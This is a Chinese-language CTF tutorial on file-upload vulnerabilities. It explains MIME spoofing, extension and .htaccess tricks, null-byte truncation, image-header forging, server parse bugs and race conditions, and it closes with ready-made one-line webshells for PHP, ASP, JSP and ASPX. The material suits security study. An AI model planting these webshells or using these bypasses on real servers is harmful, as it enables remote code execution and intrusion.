###  文件上传
!!! note
    部分，期待补充

原理

一些web应用程序中允许上传图片、视频、头像和许多其他类型的文件到服务器中。

文件上传漏洞就是利用服务端代码对文件上传路径变量过滤不严格将可执行的文件上传到一个到服务器中 ，再通过URL去访问以执行恶意代码，从而getshell。



## CTF

一般为php的服务端

### 无验证

直接上传一句话木马或者WebShell脚本即可。

### js检测

即在前端检测

可以通过直接发送上传文件的数据包，也可以禁用或修改js后发送

### MIME类型检测

`multipurpose Internet mail extensions多用途互联网邮件扩展类型`

| MIME                | 描述                  |
| ------------------- | --------------------- |
| text/html           | HTML格式              |
| application/json    | JSON数据格式          |
| multipart/form-data | 文件上传（二进制数据) |
| image/jpeg          | jpg图片格式           |

这个数据是浏览器自动打包生成的，属于后端交互的内容。

通过MIME服务端可以得知客户端上传的数据类型和请求的数据类型，并能够将对数据类型的响应结果返回到客户端

服务器代码判断`$_FILES["file"]["type"]`是不是图片格式（`image/jpeg`、`image/png`、`image/gif`），如果不是，则不允许上传该文件。

绕过方法：

通过修改数据包中的`content-type`即可更改

> 抓包后更改Content-Type为允许的类型绕过该代码限制，比如将php文件的`Content-Type:application/octet-stream`修改为`image/jpeg`、`image/png`、`image/gif`等就可以

常见MIMETYPE

> audio/mpeg -> .mp3 
>
> application/msword -> .doc 
>
> application/octet-stream -> .exe 
>
> application/pdf -> .pdf 
>
> application/x-javascript -> .js 
>
> application/x-rar -> .rar 
>
> application/zip -> .zip 
>
> image/gif -> .gif 
>
> image/jpeg -> .jpg / .jpeg 
>
> image/png -> .png 
>
> text/plain -> .txt 
>
> text/html -> .html 
>
> video/mp4 -> .mp4



### 等价扩展名



前提是**服务器配置允许**

- Apache

    在`.htaccess`或`httpd.conf`中：

    ```
    AddType application/x-httpd-php .php .php3 .phtml
    ```

    常用后缀：`*.php` `*.php3` `*.php4` `*.php5` `*.phtml` `*.pht`

    在Apache的解析顺序中，是从右到左开始解析文件后缀的，如果最右侧的扩展名不可识别，就继续往左判断，直到遇到可以解析的文件后缀为止。因此，例如上传的文件名为1.php.xxxx，因为后缀xxxx不可解析，所以向左解析后缀php。

    例如：`shell.php.ddd.1d21` ->`shell.php`

- Nginx

    在配置文件中确保类似规则

    ```cfg
    location \~ \.(php|php3|phtml)$ {
        fastcgi_pass unix:/var/run/php-fpm.sock; 
        #...其他FastCGI参数
    }
    ```







| 语言 | 等价扩展名                               |
| ---- | ---------------------------------------- |
| asp  | asa，cer，cdx                            |
| aspx | ashx，asmx，ascx                         |
| php  | php2、php3、php4、php5、phps，pht，phtml |
| jsp  | jspx，jspf                               |



####  phtml文件

 在嵌入了php脚本的html中，使用 phtml作为后缀名，web服务器会用php解释器进行解析  

.phtml是PHP 2程序的标准文件扩展名。 .php3接管了PHP 3.当PHP 4出来时，他们切换到直接.php。

较旧的文件扩展名有时仍被使用，但并不常见。

### 绕过后缀名检测

**几种基本方式**

#### 特殊文件名

在文件名后面加 “.”或空格，`windows`在保存文件的时候会自动将点“.”和空格去掉

文件后缀名后加`::$DATA`，`windows`会把`::$DATA`后的内容当成文件流处理且保留其前面的后缀名

#### 大小写

将文件的后缀名大小写混杂如：`*.pHp` `*.aSP`

#### 双写

文件名双写绕过，如：`*.pphphp`。适用于绕过`str_irepalce`

#### 名单列表绕过

如：`*.asa` `*.cer`这些是非标准扩展名，可能被服务端解析为可执行脚本

#### `.htaccess`配置文件

前提：服务器配置允许 `.htaccess` 覆盖规则（`AllowOverride All` 或至少 `AllowOverride FileInfo`）

`.htaccess`（hypertest access超文本入口），是一个php的动态网站

以吾爱破解官网为例，正常域名为https://52pojie.cn/thread.php?id=134974&page=1

而动态网站的红字部分为`thread-134974-1-1.html`，以便搜索引擎的收录

通过`.htaccess`文件，可以帮我们实现用户重定向、自定义错误页面、更改扩展名、以及使用其他文件作为index文件等，如果一个web应用允许上传`.htaccess`文件，那就意味着，攻击者可以利用这个漏洞进行更改`Apache`的配置

利用`.htaccess`文件可以指定文件以什么类型访问，简单来说就是可以让`jpg`以`php`的方式运行，这样就可以达到绕过的目的。

`.htaccess`文件中的配置指令作用于**`.htaccess`文件所在的目录及其所有子目录**，但是需要注意的是，其上级目录也可能会有.htaccess文件，而指令是按查找顺序依次生效的，所以一个特定目录下的.htaccess文件中的指令可能会覆盖其上级目录中的.htaccess文件中的指令，即**子目录中的指令会覆盖父目录或者主配置文件中的指令**。

**简单应用**

上传文件`.htaccess`内容为：

```
<FilesMatch "oasis"> 
SetHandler application/x-httpd-php //将后面的文件全部解析成php执行 
</FilesMatch>
```

 上传完之后，再次上传文件名为**oasis**的文件将被解析为php执行

**注意：上传的文件名取决于你上传的htaccess内写的内容。**

#### %00截断

前提

- **PHP 版本 < 5.3.4**（后续版本修复了 `%00` 截断漏洞）。
- **`magic_quotes_gpc = Off`** （否则 `%00` 会被转义为 `\0`，无法截断）。

原理：php的一些函数的底层是C语言，而`move_uploaded_file`就是其中之一，遇到`0x00`即`\0`会截断（作用相当于结束符，会在截断处停止读取后面的内容），0x表示16进制，URL中`%00`解码成16进制就是0x00。  而 php读取的方式是从后往前读取，遇到0x00时停止 ，故

`%00`截断分为get提交和post提交两类，区别在于对于`%00`的处理上有所不同，使用POST传地址，post不会像get对`%00`进行自动解码，需要手动完成（保持 `%00` 为 URL 编码，不能解码）

### 文件头（内容）检测

要绕过文件头检测就要在文件开头写上如下的值

```text
.jpg	FF D8 FF E0 00 10 4A 46 49 46
.gif	47 49 46 38 39 61
.png	89 50 4E 47
```

图像内容检测常用的是`getimagesize()`函数，需要把文件头部分伪造，也就是在绕过文件头检测的基础上还加了一些文件信息。

建议直接制造一个[图片马](#_15)

例如：

```
GIF89a
(...some binary data for image...)
<?php phpinfo(); ?>
(... skipping the rest of binary data ...)
```



另一种是判断是否包含`<?`或者`php`

绕过`<?`：

```text
<script language='php'>@eval($_POST[cmd]);</script>
```

绕过`php`：

```text
<?= @eval($_POST['cmd']);?>
```



绕过方法：

- 对渲染/加载测试的攻击方式是代码注入绕过。使用winhex在不破坏文件本身的渲染情况下找一个空白区进行填充代码，一般为图片的注释区。
- 对二次渲染的攻击方式就是攻击文件加载器自身。例如：

```text
上传文件数据不完整的gif文件 -> 触发报错imagecreatefromgif()函数
上传文件数据不完整的png文件 -> 触发报错imagecreatefrompng()函数
```



对文件加载器进行攻击，常见的就是溢出攻击。上传自己的恶意文件后，服务器上的文件加载器会主动进行加载测试，加载测试时被溢出攻击执行shellcode，比如access/mdb溢出。



### 解析漏洞

主要有目录解析、文件解析，Apache解析漏洞、Nginx解析漏洞、IIS7.5解析漏洞。

#### 目录解析 

基本没用了

原理：服务器会默认把 `.asp` 和 `.asp`目录下的文件都解析成asp文件

形式：`www.xxx.com/xxx.asp/xxx.jpg`

#### 文件解析 

基本没用了

原理：服务器默认不解析`;`后面的内容，因此`xxx.asp;jpg`被解析为`xxx.asp`文件了

`www.xxx.com/xxx.asp;.jpg`



#### Apache解析漏洞

其实就是[等价扩展名](#_3)

#### Nginx解析漏洞

Nginx默认是以`FastCGI`的方式支持PHP解析的

普遍的做法是在Nginx配置文件中通过 正则匹配设置**SCRIPT_FILENAME**。

当访问`www.xxx.com/phpinfo.jpg/1.php`这个 URL时

`$fastcgi_script_name`会被设置为`“phpinfo.jpg/1.php”`

然后构造成 `SCRIPT_FILENAME`传递给`PHP CGI`。

原因是开启了 `fix_pathinfo` 这个选项即`fix_pathinfo=1`

会触发 在PHP中的如下逻辑： PHP会认为`SCRIPT_FILENAME`是`phpinfo.jpg`，而`1.php`是`PATH_INFO`，所以就会 将`phpinfo.jpg`作为PHP文件来解析了。

攻击方式

1. 形式： `www.xxxx.com/UploadFiles/image/1.jpg/1.php` `www.xxxx.com/UploadFiles/image/1.jpg%00.php` `www.xxxx.com/UploadFiles/image/1.jpg/%20\0.php`

2. 另一种方法：上传一个名字为test.jpg，然后访问`test.jpg/.php`,在这个目录下就会生成一句话木马shell.php。



### 条件竞争

一些网站上传文件的逻辑时先允许上传任意文件，然后检查上传文件的文件是否包含WebShell脚本如果包含则删除该文件。

这里存在的问题是文件上传成功后和删除文件之间存在一个短暂的时间差（因为需要执行检查文件和删除文件的操作），攻击者可以利用这个时间差完成竞争条件的上传漏洞攻击。

~~试试18岁的手速？~~

可以在并发的情况下，一个脚本上传文件，一个访问文件



### 路径穿越



形式：上传的文件会被解析为日志不能执行，给出了`/uploads/xxx.php`路径并且可以查询

绕过：上传文件的时候抓包，修改文件名（filename）为`./../../../../flag`，上传成功后路径变为`/uploads/./../../../../flag`即可进行目录穿越，从而获取所需信息，如flag



### 图片马制作

用window下的cmd制作：

`copy  meinv.png /b + muma.php /a  muma.png `

其中/b代表二进制文件`binary`，放在图片后面，/a代表文字文件`ascii`

也可以用010editor直接将一句话马写在文件尾的后面

补充：可以直接修改数据包的数据，方法多种多样，不要局限

### 常用攻击代码

简单的一句话木马

```text
<?php @eval($_POST['cmd']);?>
```

绕过`<?`限制的一句话木马

```text
<script language = 'php'>@eval($_POST[cmd]);</script>
```

绕过`<?php ?>`限制的一句话木马

```text
<?= @eval($_POST['cmd']);
```

asp一句话木马

```text
<%eval(Request.Item["cmd"],”unsafe”);%>
```

JSP一句话木马

```text
<%if(request.getParameter("f")!=null)(newjava.io.FileOutputStream (application.getRealPath("\\")+request.getParameter("f"))).write (request.getParameter("t").getBytes());%>
```

ASPX一句话

```text
<script language="C#"runat="server">WebAdmin2Y.x.y a=new WebAdmin2Y.x.y("add6bb58e139be10")</script>
```



除此之外还可以用 异或取反等操作写shell的php脚本、混淆木马、不死马。

[参考](https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html)
